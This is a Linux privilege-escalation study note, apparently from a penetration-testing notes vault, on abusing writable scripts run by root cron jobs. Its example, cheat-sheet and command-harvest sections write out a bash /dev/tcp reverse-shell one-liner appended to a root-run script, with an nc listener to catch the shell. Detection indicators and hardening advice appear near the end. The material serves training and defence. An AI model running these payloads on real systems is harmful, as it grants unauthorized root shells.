---
id: deep-study-linux-privilege-escalation-cron-job-abuse
tags: [htb, pentesting, linux, privilege-escalation]
aliases: [Cron Job Abuse]
date: 2026-03-18
topic: Cron Job Abuse
type: deep-study
difficulty: intermediate
owner: vault-agent
status: draft
version: 1.1
last_updated: 2026-03-19
category: linux-privilege-escalation
tools: [cron, crontab, pspy, find, bash, nc]
---

# Cron Job Abuse

## Related Topics

- [Linux Privilege Escalation](README.md)
- [Privileged Groups](privileged-groups.md)
- [Vulnerable Services](vulnerable-services.md)

## Concept Overview

Cron is a task scheduler that runs commands on time-based intervals.
Privilege escalation risk appears when a cron task executes with elevated
privileges (typically root) while referencing files writable by
low-privileged users.

The attacker does not need direct access to root crontab if they can
modify the script that cron calls.

## Quick Navigation

- [Enumeration Checklist](#enumeration-checklist)
- [Attack Methodology](#attack-methodology)
- [Practical Example](#practical-example)
- [Detection Indicators](#detection-indicators)
- [Defensive Perspective](#defensive-perspective)

## Decision Tree

Quick decision guide for pentesters when encountering this scenario.

```
Can I write to any script/config called by cron?
    |
    +-- No -> continue with other privesc checks
    +-- Yes
         |
         +-- Is it executed by root?
                 |
                 +-- No -> lower impact, still useful for lateral actions
                 +-- Yes
                       |
                       +-- Confirm schedule -> append payload -> catch shell
```

## Knowledge Graph

- Linux privilege escalation workflow
- post-exploitation pivoting

## Internal Mechanics

- `cron` daemon reads system schedules (`/etc/crontab`, `/etc/cron.d/`) and per-user crontabs.
- Jobs execute with the context of the configured user.
- If command points to writable script path, command integrity is broken.
- Small scheduling mistakes (`*/3 * * * *` vs `0 */3 * * *`) increase trigger frequency.

## Enumeration Checklist

Commands typically used to detect this condition during enumeration.

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly
ls -la /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
./pspy64 -pf -i 1000
```

## Attack Methodology

Typical attacker workflow.

1. Discover writable files and cron-related paths.
2. Confirm root cron execution target through `pspy` or timestamp patterns.
3. Back up original script.
4. Append controlled payload while preserving script behavior.
5. Wait for trigger and validate root context.

## Decision Workflow

Condensed attacker workflow used during real engagements.

1. Enumerate write permissions.
2. Correlate writable script with cron execution.
3. Estimate schedule interval.
4. Append payload to script end.
5. Catch callback and run `id` for privilege proof.

## Decision Engine

See:

Linux privilege escalation decision workflow (authoring vault reference).

## Attack Chain

Step-by-step chain from initial discovery to privilege escalation.

1. Find world-writable script (`/dmz-backups/backup.sh`).
2. Observe periodic backup artifacts and verify cron execution via `pspy`.
3. Confirm root launches script (`/bin/bash /dmz-backups/backup.sh`).
4. Append reverse shell payload.
5. Receive root shell in listener.

## Practical Example

Example penetration testing scenario.

```bash
cp /dmz-backups/backup.sh /tmp/backup.sh.bak
echo 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1' >> /dmz-backups/backup.sh
nc -lnvp 443
```

The script keeps original tar behavior and additionally executes a
callback as root when cron triggers.

## Command Cheat Sheet

Quick reference commands for exploitation.

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
./pspy64 -pf -i 1000
cat /path/to/suspect-script.sh
cp /path/to/suspect-script.sh /tmp/script.bak
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /path/to/suspect-script.sh
nc -lnvp <PORT>
id
```

## Command Harvest

Commands in this section are automatically eligible to be copied into
the global cheat sheet located at:

    cheatsheets/Pentest Commands.md

Only include the most important practical commands used during real
penetration tests.

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
./pspy64 -pf -i 1000
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /path/to/writable-root-cron-script.sh
nc -lnvp <PORT>
```

## Attack Paths

Possible escalation chains from this technique.

- [Linux Privilege Escalation](README.md)
- [Privileged Groups](privileged-groups.md)

## Real World Scenario

Describe how this vulnerability or technique appears in real
environments.

- Enterprise backup script in shared operations folder with permissive ACL.
- Legacy migration script left writable for troubleshooting and never fixed.
- Web server maintenance script writable by service account with shell access.

## Tools

Common tools associated with this technique.

- cron
- crontab
- pspy
- find
- bash
- nc

## Detection Indicators

Signs defenders may observe if this attack occurs.

- Unexpected file hash changes in scheduled scripts.
- Outbound connections initiated by cron-managed processes.
- Root cron process spawning interactive shell behavior.

## Defensive Perspective

- Enforce least privilege and immutable permissions on cron scripts.
- Keep cron script directories root-owned and non-writable by others.
- Replace direct script execution with signed deployment pipeline artifacts.
- Alert on permission drift for files referenced in cron jobs.

## Practice Lab Idea

Suggested way to reproduce this scenario in a lab.

1. Create a Linux VM with cron running every 3 minutes.
2. Add root-owned script in writable folder.
3. Obtain low-privileged user shell.
4. Detect cron execution using `pspy`.
5. Exploit and verify root shell.

## Key Insights

- Cron abuse is configuration-driven, not exploit-CVE-driven.
- Execution frequency and write permission together determine exploitability.
- Fast, repeatable privilege escalation when schedule is short.
